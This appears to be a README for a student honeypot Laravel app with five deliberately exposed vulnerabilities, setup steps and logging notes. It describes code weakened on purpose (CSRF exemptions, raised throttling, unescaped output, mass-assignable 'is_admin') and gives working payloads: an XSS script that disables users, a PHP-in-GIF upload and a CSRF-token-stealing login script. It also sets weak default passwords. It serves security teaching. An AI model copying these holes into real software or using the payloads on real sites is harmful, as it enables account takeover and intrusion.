<p align="center"><a href="http://rgp04.hp.ti.howest.be/" target="_blank"><img alt=Honeypot" src="https://c.tenor.com/lVHG0McBDqMAAAAi/mochi-peach.gif" width="150"></a></p>

## About Honeypot

**Honeypot** is a web application that offers the visitors the chance of testing five of the top security vulnerabilities. We log the attackers attempts, rank their successes compared to other attackers, and block any intrusion from further advances by controlling the outcome of our exposed vulnerabilities. 

## Challenges
We introduce the concept of challenge failed attempts in a psychological punishment manner, for every failed attempt, a kitten dies. Those results are displayed in a public ranking for everyone to see: name, challenges solved and kittens killed. We also show the user a kitten avatar that evolves through a series of emotional statutes the more kittens you kill. 

Our five exposed security vulnerabilities are:
- Broken Access Control
- Persistent XSS
- Mass Assignment
- SQL Injection
- Image Upload Bypass

**Broken Access Control** allows a user Log in by guessing the default administrator account and brute-forcing its password.

**Persistent XSS** allows a user supplying untrusted input that, when loaded without proper validation or escaping, will execute a malicious action.

**Mass Assignment** allows a user passing an unexpected parameter that will escalate the user to admin.

**SQL Injection** allows a user interfere with the queries that the web makes to its database to Log in with the default administrator account.

**Image Upload Bypass** allows a user bypass the validation in the avatar uploader to send a file that is not an image.


## Technology stack
The technology stack used on the server side (Debian 12) is based on these dependencies:
- apache2
- PHP 8.2.7
- mariadb
- laravel
- composer
- npm
- elastic stack
- ansible

**Apache** is the most widely used web server software. Developed and maintained by Apache Software Foundation, Apache is an open source software.

**MariaDB** Server is one of the most popular open source relational databases. It's made by the original developers of MySQL and guaranteed to stay open source.

**PHP** is an acronym for "PHP: Hypertext Preprocessor" · PHP is a widely-used, open source scripting language

**Laravel** is a popular PHP framework with expressive, elegant syntax that provides the tools required for creating powerful applications.

**Composer** is a package manager commonly used in Laravel projects.

**Npm** is another package manager focused on js.

**Elastic Stack** is a group of open source products from Elastic designed to help users take data from any type of source and in any format and search, analyze, and visualize that data in real time.

**Ansible** is a software tool that provides simple but powerful automation for cross-platform computer support.

## Setup process

### Connect via ssh to your VM
```
ssh debian@IP_OF_YOUR_VM
```

Debian 12 might not come with the package `sudo` pre-installed. For this reason, at the start, we change to the `root` user using the command `su -`. Once the package `sudo` has been installed and the user `debian` is added to the group `sudo`, we keep using the user `debian`in the next steps. 

```
su -;

apt update;

apt install -y sudo apache2 php php-bcmath php-ctype php-fileinfo php-json php-mbstring php-mysql php-tokenizer php-xml php-curl composer mariadb-server npm;

echo 'export PATH="$PATH:$HOME/.config/composer/vendor/bin"' >> ~/.bashrc && export PATH=~/.config/composer/vendor/bin:$PATH;

composer global require laravel/installer;

usermod -a -G sudo debian

su debian;
```

# Creating the database

Laravel's configuration file `.env` contains the required values that allow Laravel connecting to MariaDB. There, we choose that the database's user was `root`, with password `honeypot`. And that the database's name was `honeypot`.

```
sudo mysql_secure_installation;

	Enter current password for root (enter for none): 
	Switch to unix_socket authentication [Y/n] n
	Change the root password? [Y/n] Y
	New password:  honeypot
	Re-enter new password: honeypot
	Remove anonymous users? [Y/n] Y
	Disallow root login remotely? [Y/n] Y
	Remove test database and access to it? [Y/n] Y
	Reload privilege tables now? [Y/n] Y

sudo mysql -uroot -e "create database honeypot";
```

If you made changes to the previous step, don't forget to update the `.env` file that will be installed in the next step of **Deploying the project**. Otherwise, Laravel will give you a database connection error.

# Deploying the project

The website itself, has a fake admin named `admin`, with password `admin`. And a real admin with name `superadmin`, with password `superadmin`.

```
git clone https://github.com/Videra/honeypot.git /var/www/honeypot

cd $HOME/honeypot

composer update;

npm install;
npm run dev;

sudo chown -R $USER:www-data /var/www/honeypot/storage;
sudo chown -R $USER:www-data /var/www/honeypot/bootstrap/cache;
sudo chmod -R 775 /var/www/honeypot/storage;
sudo chmod -R 775 /var/www/honeypot/bootstrap/cache;

php artisan migrate:fresh --seed;
php artisan storage:link;
```

```
sudo nano /etc/apache2/sites-available/honeypot.conf;

<VirtualHost *:80>
    ServerName honeypot
    ServerAdmin admin@howest.be
    DocumentRoot /var/www/honeypot/public
    Redirect / https://honeypot

    <Directory /var/www/honeypot>
        Options FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

```
sudo nano /etc/apache2/sites-available/honeypot-ssl.conf;

<IfModule mod_ssl.c>
    <VirtualHost *:443>
        ServerName honeypot
        ServerAdmin admin@howest.be
        DocumentRoot /var/www/honeypot/public
    
        <Directory /var/www/honeypot>
            Options FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>
    
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
    
        SSLEngine On
        SSLCertificateFile      /etc/ssl/certs/ssl-cert-snakeoil.pem
        SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
    
        <FilesMatch "\.(cgi|shtml|phtml|php)$">
            SSLOptions +StdEnvVars
        </FilesMatch>
        <Directory /usr/lib/cgi-bin>
            SSLOptions +StdEnvVars
        </Directory>
    </VirtualHost>
</IfModule>
```

```
sudo a2enmod rewrite;
sudo a2enmod ssl;
sudo a2ensite honeypot;
sudo a2ensite honeypot-ssl;

sudo systemctl restart apache2;
```

Now you can visit your website at https://IP_OF_YOUR_VM

### Disable Apache2 signatures
We Hide Apache displays name & version by using ServerSignature Off in /etc/apache2/conf-enabled/security.conf

### Setup Elasticsearch
Finally, we configure Elastic Stack for logging


## Logging
We take care of advanced logging by using **events**, **listeners** and **observers**. We initiate an event on every action that is to be logged, then associate a Listener to it that will execute the action of logging. Observers are used to monitor Laravel internal interaction with the model User and the database, for every interaction we link an event and launch the respective listener.

This is the list of Listeners:
- LogAchievedBrokenAccessControl
- LogAchievedImageUploadBypass
- LogAchievedMassAssignment
- LogAchievedSQLi
- LogAchievedXSS
- LogAttemptedBrokenAccessControl
- LogAttemptedImageUploadBypass
- LogAttemptedMassAssignment
- LogAttemptedSQLi
- LogAttemptedXSS
- LogAuthenticated
- LogAuthenticationAttempt
- LogChallengeAttempted
- LogChallengeCompleted
- LogCreatedUser
- LogCurrentDevice
- LogDeletedUser
- LogFailedLogin
- LogLockout
- LogOtherDeviceLogout
- LogPasswordReset
- LogRegisteredUser
- LogSessionClosedUser
- LogSuccessfulLogin
- LogSuccessfulLogout
- LogUpdatedUser
- LogValidated
- LogVerified


## Controlling the vulnerabilities

### Broken Authentication

#### Disable CSRF security
Laravel protects against Brute Force Attacks and CSRF attacks by using a randomized token on every form generation. If you use Burp with this protection enabled, you will only get 419 page expired responses.
In order to use Burp and be able to brute force the login form with common users/passwords we need to disable it. This is how:

You can Disable CSRF on few routes by editing App\Http\Middleware\VerifyCsrfToken
```
/**
 * The URIs that should be excluded from CSRF verification.
 *
 * @var array
 */
protected $except = [
    'login'
];
```

#### Lower throttling security
Now, brute force sends requests very fast continuously, and Laravel has a protection on how many requests you can send per minute, throttling. We need to also lower this protection by increasing the max attempts permitted.

In your app/Http/Controllers/Auth/LoginController.php, you can add two properties:
```
class LoginController extends Controller
{
    // Throttling control
    protected $maxAttempts = 30; // Default is 5
    protected $decayMinutes = 1; // Default is 1

    // ...
}
```

After disabling and lowering this protections we can Brute Force using Burp Suite:
1. Download a wordlist of 1000 common passwords
2. Brute force the login form using Burp Suite (see video)
3. Eventually we will find the password for the user admin

Honeypot detection
If the attacker uses this credentials to login, we can detect it, log the attempt, and disconnect the attacker.
We do this via the middleware CheckIfHoneypotAdmin, by checking if the auth user is our "fake" admin (id=1) on all http web requests.



### Persistent XSS

XSS attacks are an output problem, Laravel encourages you to escape all output, regardless where it came from.
Our output is generated by Blade. By default, Blade outputs values using {{ }} statements that automatically send it through PHP's htmlspecialchars function to prevent XSS attacks. We can skip this protection by using {!! !!} instead.

A persistent XSS is possible when a web app takes user input and stores it into its servers. Then it is displayed in a harmful way. We will allow this vulnerability to happen in a User's name attribute, by removing escaped protections in this files:

We allow unescapted user input in resources/views/partials/navbar.blade.php
- This allows a user to confirm that a XSS Vulnerability exists
```
{!! Auth()->user()->name !!}
```

We allow unescapted user input in resources/views/users/row.blade.php
- This loads the XSS Payload in the Admin Panel on an admin session
- If the admin disables the user, the data will be escaped to prevent futher Payloads
```
<td class="align-middle">
    @if($user->isEnabled())
        {!! $user->name !!}
    @else
        {{ $user->name }}
    @endif
</td>
```

Lets exploit this, our goal is to disable all users. This is achieved by sending a PUT request to /users/{id}/disable. But this route is protected by CSRF, so we will disable it first. You can Disable CSRF on few routes by editing App\Http\Middleware\VerifyCsrfToken
```
/**
 * The URIs that should be excluded from CSRF verification.
 *
 * @var array
 */
protected $except = [
    'users/*/disable'
];
```

We create a user with a username that contains the XSS Attack
```
<script>for(let i=0;i<100;i++){fetch("/users/"+i+"/disable",{method:"put"});}</script>
```

When the administrator loads the list of users he will disable all users.

**This was however a little too advanced to achieve, and we give the challenge for good as long as a user introduces some form of XSS in an unsanitized input.**


### Mass Assignment
https://laravel.com/docs/8.x/eloquent#mass-assignment

You may use the create method to "save" a new model using a single PHP statement. The inserted model instance will be returned to you by the method:
```
use App\Models\User;

$user = User::create([
'name' => 'Laura',
]);
```

However, before using the create method, you will need to specify either a fillable or guarded property on your model class. These properties are required because all Eloquent models are protected against mass assignment vulnerabilities by default.

A mass assignment vulnerability occurs when a user passes an unexpected HTTP request field and that field changes a column in your database that you did not expect. For example, a malicious user might send an is_admin parameter through an HTTP request, which is then passed to your model's create method, allowing the user to escalate themselves to an administrator.

So, to get started, you should define which model attributes you want to make mass assignable. You may do this using the $fillable property on the model. For example, let's make the name attribute of our Flight model mass assignable:
```
<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class User extends Model
{
    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = ['name', 'is_admin'];
}
```

Once you have specified which attributes are mass assignable, you may use the create method to insert a new record in the database. After receiving a POST request in the variable $request, we send it in full to the create method, which returns the newly created model instance:
```
#$user = User::create($request->all());

```

**Because we mass assigned 'is_admin', by setting this input field manually or using Burp in our user form, you can become an admin. Like: `is_admin=1`**


### SQL Injection
RawMethods  are Laravel’s neat way of letting developers use raw queries in only  specific parts of a database query. Some examples of Laravel’s  RawMethods include selectRaw, whereRaw, and orderByRaw. RawMethods, however, are vulnerable to SQL injection, which the official documentation  states in the following sentence: “Remember, Laravel can not guarantee  that any query using raw expressions is protected against SQL injection  vulnerabilities.”

To demonstrate SQL injection in the whereRaw RawMethod, let’s take a look at the following code:
```
DB::table('posts')
    ->select('postTitle', 'postBody')
    ->whereRaw('id =' . $id)->first();
```

The code sample above should return a single row from the posts table. Or nothing if no post exists with the id specified. However, this code has a third unintended behavior.

The value for id is defined by user input. Let’s look at what happens when a user enters the following value:
```
https://example.com/post/11 AND 1=1
```

The HTTP request above will lead to the execution of the following SQL query:
```
SELECT postTitle, postBody FROM posts WHERE id = 11 AND 1=1
```

The application will return the row with id 11 as expected. This is because 1=1 is always true. However, say a hacker changes 1=1 to something that’s always false, for example:
```
SELECT postTitle, postBody FROM posts WHERE id = 11 AND 1=2
```

This will cause the application to return zero rows or crash. This  behavior shows the existence of SQL injection vulnerability in the whereRaw part of our initial query.




Prevention

We recommend anyone using Laravel to avoid raw queries as much as they can.
Doing  so, they can enjoy some of the security features already built in to  the framework. But if you must use raw queries, you should ensure you do  server-side validation of user inputs.
One way to fix the vulnerability in our example is to validate that the value of id is an integer. You can do so with the following code:
```
$validator = Validator::make(['id' => $id], [
    'id' => 'required|numeric'
]);

if ($validator->fails()) {
    abort(404);
}else {
    //Run query
}
```

Another fix is to rewrite the initial query using a parameterized query.
```
DB::table('posts')
    ->select('postTitle', 'postBody')
    ->whereRaw('id = ?', $id)->first();
```

We introduced a ? as a placeholder for the value of id and provided the actual value for id as a second parameter for whereRaw. 

Or using Eloquent default query builder
```
Post::where('postTitle', 'postBody')
    ->where('id', $id)->first();
```

**We achieve the challenge by using around 40 different SQLi commands that lead to login with user 'admin', for example `admin' --`**


### Image Upload Bypass
By bypassing laravel’s image validation we can achieve other attacks, first and most loved is XSS and as it is an stored xss we can write a full exploit that let us bypass CSRF and then we are free to do whatever we want with higher privileges.

Notice that in our Controller file we specified that only image files with jpeg,png,jpg,gif,svg mimes are allowed, so to bypass this protection we need to intercept the upload POST request in Burp and change the mime type to image/jpeg. But Laravel logic also can still block some php or js files, so we go further into the exploitation using https://mh-nexus.de/en/hxd/

Using this hex editor, open your "image" file and add these characters `FF D8 FF E0` at the very beginning of it.

Al alternative is camouflaging the file as a GIF file using
```
GIF89a<?php
phpinfo();
?>
```

With any of this options you can upload this file bypassing Laravel 8 image validation.

We could even upload a combined XSS attack that allows CSRF bypass like this:
```
����<html>
<head>
<title>Laravel Csrf Bypass</title>
</head>
<body>
<script>
function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send("_token=" + token + "&name=admin&password=1234567890");
}
function getTokenJS() {
    var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.open("GET", "/login", true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            page = xhr.response
            input = page.getElementsByTagName("input")[0];
            alert("The token is: " + input.value);
            submitFormWithTokenJS(input.value);
        }
    };
    xhr.send(null);
}
getTokenJS();
var POST_URL="/login"
getTokenJS();
</script>
</html>
```

**But this was a bit too advanced for the challenges, so we kept it simple, as long as the user uploads a file with an extension not part of an image it will be achieved.**


That is all, thank you for reading.


